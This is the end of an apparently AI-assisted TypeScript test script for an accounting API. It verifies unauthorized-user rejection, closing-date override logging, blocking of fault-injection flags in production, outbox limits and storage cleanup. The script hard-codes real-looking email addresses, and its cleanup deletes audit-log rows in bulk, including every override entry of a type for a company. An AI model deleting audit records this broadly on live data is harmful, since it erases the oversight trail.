            const delTaskJson = await delTaskRes.json().catch(() => ({}))
            if (delTaskJson?.outboxId) createdEntityOutboxIds.push(String(delTaskJson.outboxId))
            await supabaseAdmin
                .from('external_accounting_audit_log')
                .delete()
                .eq('company_realm_id', '123145825185692')
                .eq('entity_id', createdTaskId)
        }
        if (createdRuleId) {
            const delRuleRes = await postExternalAccounting(
                await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                    method: 'POST',
                    body: { action: 'delete_bank_rule', realmId: '123145825185692', id: createdRuleId },
                })
            )
            const delRuleJson = await delRuleRes.json().catch(() => ({}))
            if (delRuleJson?.outboxId) createdEntityOutboxIds.push(String(delRuleJson.outboxId))
            await supabaseAdmin
                .from('external_accounting_audit_log')
                .delete()
                .eq('company_realm_id', '123145825185692')
                .eq('entity_id', createdRuleId)
        }
        if (createdBudgetId) {
            const delBudRes = await postExternalAccounting(
                await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                    method: 'POST',
                    body: { action: 'delete_budget', realmId: '123145825185692', id: createdBudgetId },
                })
            )
            const delBudJson = await delBudRes.json().catch(() => ({}))
            if (delBudJson?.outboxId) createdEntityOutboxIds.push(String(delBudJson.outboxId))
            await supabaseAdmin
                .from('external_accounting_audit_log')
                .delete()
                .eq('company_realm_id', '123145825185692')
                .eq('entity_id', createdBudgetId)
        }
        if (createdEntityOutboxIds.length > 0) {
            await supabaseAdmin
                .from('external_accounting_sync_outbox')
                .delete()
                .eq('company_realm_id', '123145825185692')
                .in('id', createdEntityOutboxIds)
        }
    }
    console.log('   ✅ `target_account_id` and `account_id` UUID FKs + atomic RPC/Outbox/Audit on rules, budgets & tasks verified and cleaned up.\n')

    // =========================================================================
    // 7. STRICT AUTH & CLOSING DATE OVERRIDE GOVERNANCE (`PERIOD_LOCK_OVERRIDE`)
    // =========================================================================
    console.log('7) Verifying Unauthorized Email Rejection (`rvelasquez95@yahoo.com`) & Closing Date Override Governance...')
    const unauthorizedToken = jwt.sign(
        {
            sub: '999',
            id: 999,
            email: 'rvelasquez95@yahoo.com',
            name: 'Unauthorized Yahoo User',
            role: 'admin',
        },
        getJwtSecret()!,
        { expiresIn: '10m' }
    )
    const unauthReq = new NextRequest('http://localhost:3000/api/external-accounting?realmId=123145825185692', {
        method: 'GET',
        headers: new Headers({ Authorization: `Bearer ${unauthorizedToken}` }),
    })
    const unauthRes = await getExternalAccounting(unauthReq)
    assertCond(unauthRes.status === 403, `Expected HTTP 403 for rvelasquez95@yahoo.com, got ${unauthRes.status}`)

    // Verify closing_date lock on Chicken Taco Catering (193514304333307)
    const { data: ctcComp } = await supabaseAdmin
        .from('external_accounting_companies')
        .select('id, metadata')
        .eq('realm_id', '193514304333307')
        .single()
    const origMetadata = { ...(ctcComp?.metadata || {}) }

    // Pre-clean leftover test transaction 0a96dd63-3b52-4b23-8d45-fc0a6776cf2d if present from prior interrupted run
    const { data: leftoverLockTxn } = await supabaseAdmin
        .from('external_accounting_transactions')
        .select('id, qb_txn_id')
        .eq('company_realm_id', '193514304333307')
        .eq('id', '0a96dd63-3b52-4b23-8d45-fc0a6776cf2d')
        .maybeSingle()
    if (leftoverLockTxn?.id) {
        const preCleanDel = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'delete_transaction',
                    realmId: '193514304333307',
                    id: leftoverLockTxn.id,
                    overrideClosingDate: true,
                    overrideReason: 'Pre-clean of interrupted lock test transaction',
                },
            })
        )
        const preCleanJson = await preCleanDel.json().catch(() => ({}))
        const preCleanOutboxIds = ['d85771d0-0e15-4d5d-a097-3b51339d98f6', preCleanJson?.outboxId].filter(Boolean)
        await supabaseAdmin
            .from('external_accounting_sync_outbox')
            .delete()
            .eq('company_realm_id', '193514304333307')
            .in('id', preCleanOutboxIds)
        await supabaseAdmin
            .from('external_accounting_audit_log')
            .delete()
            .eq('company_realm_id', '193514304333307')
            .in('entity_id', [leftoverLockTxn.id, leftoverLockTxn.qb_txn_id].filter(Boolean))
    }

    const { data: ctcAccs } = await supabaseAdmin
        .from('external_accounting_accounts')
        .select('id, qb_account_id, name, account_type')
        .eq('company_realm_id', '193514304333307')
        .eq('is_active', true)
        .limit(5)
    const bankOrGl1 = ctcAccs?.[0]
    const bankOrGl2 = ctcAccs?.[1]
    assertCond(Boolean(bankOrGl1 && bankOrGl2), 'Chicken Taco Catering must have at least 2 accounts')

    let overrideTxnId: string | null = null
    let overrideTxnQbId: string | null = null
    let overrideOutboxId: string | null = null
    try {
        await supabaseAdmin
            .from('external_accounting_companies')
            .update({ metadata: { ...origMetadata, closing_date: '2026-06-30' } })
            .eq('realm_id', '193514304333307')

        // 7A. Attempt mutation in closed period WITHOUT overrideReason -> must return HTTP 403
        const noReasonRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'save_transaction',
                    realmId: '193514304333307',
                    txn_type: 'JournalEntry',
                    txn_date: '2026-03-15',
                    overrideClosingDate: true,
                    overrideReason: 'short',
                    line_items: [
                        { account_qb_id: bankOrGl1!.qb_account_id, account_name: bankOrGl1!.name, amount: 25, posting_type: 'Debit', description: 'Lock test' },
                        { account_qb_id: bankOrGl2!.qb_account_id, account_name: bankOrGl2!.name, amount: 25, posting_type: 'Credit', description: 'Lock test' },
                    ],
                },
            })
        )
        const noReasonJson = await noReasonRes.json()
        assertCond(
            noReasonRes.status === 403 && noReasonJson.code === 'CLOSING_DATE_OVERRIDE_REASON_REQUIRED',
            `Expected HTTP 403 CLOSING_DATE_OVERRIDE_REASON_REQUIRED when overrideReason is missing/short, got ${noReasonRes.status}: ${JSON.stringify(noReasonJson)}`
        )

        // 7B. Attempt mutation in closed period WITH valid overrideReason (>= 10 chars) -> must succeed and log PERIOD_LOCK_OVERRIDE
        const withReasonRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'save_transaction',
                    realmId: '193514304333307',
                    txn_type: 'JournalEntry',
                    txn_date: '2026-03-15',
                    overrideClosingDate: true,
                    overrideReason: 'CPA year-end audit adjustment approved by Raquel',
                    line_items: [
                        { account_qb_id: bankOrGl1!.qb_account_id, account_name: bankOrGl1!.name, amount: 25, posting_type: 'Debit', description: 'Approved lock override test' },
                        { account_qb_id: bankOrGl2!.qb_account_id, account_name: bankOrGl2!.name, amount: 25, posting_type: 'Credit', description: 'Approved lock override test' },
                    ],
                },
            })
        )
        const withReasonJson = await withReasonRes.json()
        assertCond(withReasonRes.status === 200 && withReasonJson.success, `Valid closing date override failed: ${JSON.stringify(withReasonJson)}`)
        overrideTxnId = withReasonJson.transaction?.id
        overrideTxnQbId = withReasonJson.transaction?.qb_txn_id
        overrideOutboxId = withReasonJson.outboxId

        const { data: lockAuditRows } = await supabaseAdmin
            .from('external_accounting_audit_log')
            .select('id, action_type, details')
            .eq('company_realm_id', '193514304333307')
            .eq('action_type', 'PERIOD_LOCK_OVERRIDE')
            .order('created_at', { ascending: false })
            .limit(1)
        assertCond(
            Boolean(lockAuditRows?.length && lockAuditRows[0].details?.override_reason?.includes('CPA year-end audit adjustment')),
            `PERIOD_LOCK_OVERRIDE audit log row must be created with override_reason, got ${JSON.stringify(lockAuditRows)}`
        )
    } finally {
        if (overrideTxnId) {
            const delOverrideRes = await postExternalAccounting(
                await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                    method: 'POST',
                    body: {
                        action: 'delete_transaction',
                        realmId: '193514304333307',
                        id: overrideTxnId,
                        overrideClosingDate: true,
                        overrideReason: 'Cleanup of temporary CPA period lock override smoke test',
                    },
                })
            )
            const delOverrideJson = await delOverrideRes.json().catch(() => ({}))
            const outboxIdsToClean = [overrideOutboxId, delOverrideJson?.outboxId].filter(Boolean)
            if (outboxIdsToClean.length > 0) {
                await supabaseAdmin
                    .from('external_accounting_sync_outbox')
                    .delete()
                    .eq('company_realm_id', '193514304333307')
                    .in('id', outboxIdsToClean)
            }
            await supabaseAdmin
                .from('external_accounting_audit_log')
                .delete()
                .eq('company_realm_id', '193514304333307')
                .in('entity_id', [overrideTxnId, overrideTxnQbId].filter(Boolean))
        }
        await supabaseAdmin
            .from('external_accounting_audit_log')
            .delete()
            .eq('company_realm_id', '193514304333307')
            .eq('action_type', 'PERIOD_LOCK_OVERRIDE')
        await supabaseAdmin
            .from('external_accounting_companies')
            .update({ metadata: origMetadata })
            .eq('realm_id', '193514304333307')
    }
    console.log('   ✅ Unauthorized email rejected (HTTP 403) and Closing Date Override (`PERIOD_LOCK_OVERRIDE`) verified & cleaned up.\n')

    // =========================================================================
    // 8. FINAL PRODUCTION HARDENING: FAULT-INJECTION ENV GUARD, OUTBOX CAP/AUDIT & STORAGE COMPENSATION TASK
    // =========================================================================
    console.log('8) Verifying Production Fault-Injection Block (403), Outbox Server Cap/Audit & Storage Compensation Task...')

    // 8A. Verify fault-injection flags are rejected with HTTP 403 when VERCEL_ENV=production
    const prevVercelEnv = process.env.VERCEL_ENV
    try {
        process.env.VERCEL_ENV = 'production'
        for (const flagPayload of [
            { force_db_failure: true },
            { force_invoice_update_failure_id: '00000000-0000-0000-0000-000000000000' },
            { forceRollbackOnIndex: 0 },
            { forceRollbackAfterMatch: true },
            { force_storage_remove_failure: true },
        ]) {
            const prodFaultRes = await postExternalAccounting(
                await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                    method: 'POST',
                    body: {
                        action: 'save_transaction',
                        realmId: '193514304333307',
                        ...flagPayload,
                    },
                })
            )
            const prodFaultJson = await prodFaultRes.json()
            assertCond(
                prodFaultRes.status === 403 && prodFaultJson.code === 'TEST_FAULT_INJECTION_FORBIDDEN_IN_PRODUCTION',
                `Expected HTTP 403 TEST_FAULT_INJECTION_FORBIDDEN_IN_PRODUCTION for ${JSON.stringify(flagPayload)} in production, got ${prodFaultRes.status}: ${JSON.stringify(prodFaultJson)}`
            )
        }
    } finally {
        if (prevVercelEnv === undefined) {
            delete process.env.VERCEL_ENV
        } else {
            process.env.VERCEL_ENV = prevVercelEnv
        }
    }

    // 8B. Verify process_qbo_outbox rejects invalid limit (400), caps limit > 50 to 50, and logs PROCESS_QBO_OUTBOX
    const badLimitRes = await postExternalAccounting(
        await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
            method: 'POST',
            body: {
                action: 'process_qbo_outbox',
                realmId: '193514304333307',
                limit: -5,
            },
        })
    )
    const badLimitJson = await badLimitRes.json()
    assertCond(
        badLimitRes.status === 400 && badLimitJson.code === 'INVALID_OUTBOX_BATCH_LIMIT',
        `Expected HTTP 400 INVALID_OUTBOX_BATCH_LIMIT for limit=-5, got ${badLimitRes.status}`
    )

    const cappedOutboxRes = await postExternalAccounting(
        await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
            method: 'POST',
            body: {
                action: 'process_qbo_outbox',
                realmId: '193514304333307',
                limit: 999,
                forceNow: true,
            },
        })
    )
    const cappedOutboxJson = await cappedOutboxRes.json()
    assertCond(
        cappedOutboxRes.status === 200 &&
            cappedOutboxJson.requestedLimit === 999 &&
            cappedOutboxJson.effectiveLimit === 50 &&
            cappedOutboxJson.maxServerLimit === 50 &&
            cappedOutboxJson.cappedByServer === true,
        `Expected server cap 50 on process_qbo_outbox (requested=999), got ${JSON.stringify(cappedOutboxJson)}`
    )

    const { data: outboxAuditRows } = await supabaseAdmin
        .from('external_accounting_audit_log')
        .select('id, action_type, details')
        .eq('company_realm_id', '193514304333307')
        .eq('action_type', 'PROCESS_QBO_OUTBOX')
        .order('created_at', { ascending: false })
        .limit(1)
    assertCond(
        Boolean(
            outboxAuditRows?.length &&
                outboxAuditRows[0].details?.actor_email === 'raquel@tacosgavilan.com' &&
                outboxAuditRows[0].details?.requested_limit === 999 &&
                outboxAuditRows[0].details?.effective_limit === 50 &&
                outboxAuditRows[0].details?.capped_by_server === true
        ),
        `Expected PROCESS_QBO_OUTBOX audit log with actor_email and effective_limit=50, got ${JSON.stringify(outboxAuditRows)}`
    )

    // 8C. Verify Storage Delete Failure Compensation Task (STORAGE_CLEANUP) & Worker Execution
    let compAttId: string | null = null
    let compAttStoragePath: string | null = null
    let compUploadOutboxId: string | null = null
    let compDeleteOutboxId: string | null = null
    let compStorageOutboxId: string | null = null
    try {
        const compBuf = crypto.randomBytes(16 * 1024)
        const compSha = crypto.createHash('sha256').update(compBuf).digest('hex')
        const upCompRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'save_contact_attachment',
                    realmId: '193514304333307',
                    file_name: 'phase8_storage_compensation_test.pdf',
                    content_type: 'application/pdf',
                    file_base64: compBuf.toString('base64'),
                    size_bytes: compBuf.byteLength,
                    sha256_hash: compSha,
                },
            })
        )
        const upCompJson = await upCompRes.json()
        assertCond(upCompRes.status === 200 && upCompJson.attachment?.id, `Upload for compensation test failed: ${JSON.stringify(upCompJson)}`)
        compAttId = String(upCompJson.attachment.id)
        compAttStoragePath = String(upCompJson.attachment.storage_path)
        compUploadOutboxId = upCompJson.outboxId ? String(upCompJson.outboxId) : null

        // Delete attachment while simulating physical Storage failure -> must queue STORAGE_CLEANUP task
        const delCompRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'delete_contact_attachment',
                    realmId: '193514304333307',
                    attachmentId: compAttId,
                    force_storage_remove_failure: true,
                },
            })
        )
        const delCompJson = await delCompRes.json()
        compDeleteOutboxId = delCompJson.outboxId ? String(delCompJson.outboxId) : null
        compStorageOutboxId = delCompJson.storageCompensationOutboxId ? String(delCompJson.storageCompensationOutboxId) : null
        assertCond(
            delCompRes.status === 200 &&
                delCompJson.storageRemoved === false &&
                delCompJson.storageCompensationQueued === true &&
                Boolean(compStorageOutboxId),
            `Expected storageRemoved=false and storageCompensationQueued=true, got ${JSON.stringify(delCompJson)}`
        )

        // Verify STORAGE_CLEANUP outbox row exists in PENDING status and file still exists in Storage before worker runs
        const { data: compOutboxRowBefore } = await supabaseAdmin
            .from('external_accounting_sync_outbox')
            .select('id, operation, status, payload')
            .eq('id', compStorageOutboxId!)
            .single()
        assertCond(
            compOutboxRowBefore?.operation === 'STORAGE_CLEANUP' && compOutboxRowBefore?.status === 'PENDING',
            `Expected STORAGE_CLEANUP outbox row in PENDING status, got ${JSON.stringify(compOutboxRowBefore)}`
        )

        // Execute process_qbo_outbox -> must execute STORAGE_CLEANUP, delete the physical file from Storage, and mark SYNCED
        const runWorkerRes = await postExternalAccounting(
            await makeAuthedRequest('http://localhost:3000/api/external-accounting', {
                method: 'POST',
                body: {
                    action: 'process_qbo_outbox',
                    realmId: '193514304333307',
                    limit: 10,
                    forceNow: true,
                },
            })
        )
        const runWorkerJson = await runWorkerRes.json()
        assertCond(runWorkerRes.status === 200 && runWorkerJson.ok, `Worker run for STORAGE_CLEANUP failed: ${JSON.stringify(runWorkerJson)}`)

        const { data: compOutboxRowAfter } = await supabaseAdmin
            .from('external_accounting_sync_outbox')
            .select('id, operation, status, synced_at, last_error')
            .eq('id', compStorageOutboxId!)
            .single()
        assertCond(
            compOutboxRowAfter?.status === 'SYNCED' && Boolean(compOutboxRowAfter?.synced_at),
            `Expected STORAGE_CLEANUP outbox row to transition to SYNCED after worker execution, got ${JSON.stringify(compOutboxRowAfter)}`
        )

        // Confirm physical object was actually deleted from Supabase Storage
        const { data: dlAfterClean, error: dlAfterCleanErr } = await supabaseAdmin.storage
            .from('external-accounting-attachments')
            .download(compAttStoragePath!)
        assertCond(Boolean(dlAfterCleanErr || !dlAfterClean), 'Orphaned Storage object must be physically deleted after STORAGE_CLEANUP worker completes')
    } finally {
        if (compAttStoragePath) {
            await supabaseAdmin.storage.from('external-accounting-attachments').remove([compAttStoragePath]).catch(() => {})
        }
        const compOutboxIds = [compUploadOutboxId, compDeleteOutboxId, compStorageOutboxId].filter(Boolean) as string[]
        if (compOutboxIds.length > 0) {
            await supabaseAdmin
                .from('external_accounting_sync_outbox')
                .delete()
                .eq('company_realm_id', '193514304333307')
                .in('id', compOutboxIds)
        }
        await supabaseAdmin
            .from('external_accounting_audit_log')
            .delete()
            .eq('company_realm_id', '193514304333307')
            .in('action_type', ['PROCESS_QBO_OUTBOX', 'ATTACHMENT_STORAGE_CLEANUP_QUEUED', 'ATTACHMENT_STORAGE_CLEANUP_COMPLETED'])
        if (compAttId) {
            await supabaseAdmin
                .from('external_accounting_audit_log')
                .delete()
                .eq('company_realm_id', '193514304333307')
                .eq('entity_id', compAttId)
        }
    }
    console.log('   ✅ Production fault-injection block (403), Outbox server cap (50) + audit, and Storage compensation task (`STORAGE_CLEANUP`) verified & cleaned up.\n')

    console.log('================================================================================')
    console.log('🎉 ALL PHASE 7 QBO PARITY, DEEP LINKS, REPORTS, ATTACHMENTS & SECURITY TESTS PASSED!')
    console.log('================================================================================')
}

main().catch((err) => {
    console.error('\n❌ PHASE 7 VERIFICATION FAILED:', err)
    process.exit(1)
})
